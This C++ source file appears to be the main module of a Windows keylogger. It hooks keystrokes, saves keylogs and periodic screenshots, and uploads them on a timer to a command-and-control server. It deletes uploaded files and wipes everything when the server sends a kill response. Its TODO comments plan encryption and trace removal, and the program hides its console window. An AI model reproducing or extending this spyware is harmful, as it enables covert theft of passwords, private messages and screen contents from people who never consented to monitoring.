// TODO delete logs after running them
// TODO grab screen buffer based on timer
// TODO encrypt logs and images with hard coded public key
// TODO compress screenshots
// TODO look for strings in executable
// TODO potentially send debug logs back to user as well
// TODO see about exiting without joining thread (is it dangerous)
// TODO delete all files when kill response is reached



#include "Settings.h"

#include "Socket.h"
#include <windows.h>

#include "Utils.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "MailUtils.h"
#include "KeyboardManager.h"
#include "Screenshot.h"

#include <iostream>
#include <filesystem>
#include <algorithm>

void kill()
{
	KeyboardManager::GetInstance().UninstallHooks();
	
	for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
	{
		std::filesystem::remove(entry.path());
	}

	exit(0);
}

// LogTimer Handler function
void WriteKeylog()
{
	if (KeyboardManager::GetInstance().keylog.empty())
		return;
	
	if (IO::WriteLog(KeyboardManager::GetInstance().keylog))
	{
		KeyboardManager::GetInstance().keylog = "";
		IO::WriteAppLog("Appended to Master Log");

		std::cout << "wrote to keylog" << std::endl;
	}
	else
	{
		IO::WriteAppLog("Master Log file failed to open. Keylog'" + KeyboardManager::GetInstance().keylog + "'");
	}
}

// screenshotTimer Handler function
void SaveScreenshot()
{
	std::string path = IO::GetOutputPath(true) + Utils::DateTime::Now().GetTimestamp() + ".jpeg";
	Screenshot ss(path);
	if (ss.Process())
	{
		IO::WriteAppLog("Succesfully Save screenshot to path " + path);
	}
	std::cout << "Screenshot Saved to " << path << std::endl;
}

// dumpTimer Handler function
void DumpCache()
{
	// Open connection with comand and control server
	ClientSocket ccSocket(CC_HOSTNAME, CC_PORT);
	if (!ccSocket.IsActive())
	{
		IO::WriteAppLog("Connection to " + Utils::ToString(CC_HOSTNAME) + " on port " + Utils::ToString(CC_PORT) + " failed");

		ccSocket.Close();
		return;	// Files will be left alone
	}

	try {
		for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
		{
			std::string path = Utils::ToString(entry.path());
			// Remove quotes around path (why the hell does filesystem::directory_entry.path() return them in the first place?)
			path.erase(std::remove(path.begin(), path.end(), '"'), path.end());

			RESPONSE_CODE res = ccSocket.SendFile(path);
			if (res == KILL)
			{
				kill();
			}
			else if (res == SUCCESS)
			{
				std::cout << "Sent [" << path << "] Successfully" << std::endl;
				IO::WriteAppLog("Successfully sent file [" + path + "]");	

				if (std::filesystem::remove(path))
					IO::WriteAppLog("Deleted File " + path);
				else
					IO::WriteAppLog("Failed to delete file " + path);
				std::cout << "deleted file" << std::endl;
			}
			else
			{
				std::cout << "Failed to send [" << path << "]" << std::endl;
				IO::WriteAppLog("File [" + path + "] failed to send");
			}
		}
	}
	catch (std::filesystem::filesystem_error e)
	{
		IO::WriteAppLog("Failed to dump because output directory does not exist");
	}

	ccSocket.Close();
}

int main(int argc, char** argv)
{
	// Makes output directory for logs
	IO::MkDir(IO::GetOutputPath(true));

	// Start Listening to keystrokes
	KeyboardManager::GetInstance().InstallHooks();

	// Create and Start log timer
	Timer logTimer(WriteKeylog, LOG_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
	logTimer.Start(true);
	IO::WriteAppLog("Log Timer Started");

	// Create and Start Screenshot Timer
	Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
	screenshotTimer.Start(true);
	IO::WriteAppLog("Screenshot Timer Started");

	// Create and Start Dump Timer
	Timer dumpTimer(DumpCache, DUMP_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
	dumpTimer.Start(true);
	IO::WriteAppLog("Dump Timer Started");


	// Run infinite loop and prevent console window from showing
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	KeyboardManager::GetInstance().UninstallHooks();

	logTimer.Stop();
	screenshotTimer.Stop();
	dumpTimer.Stop();

	return 0;
}
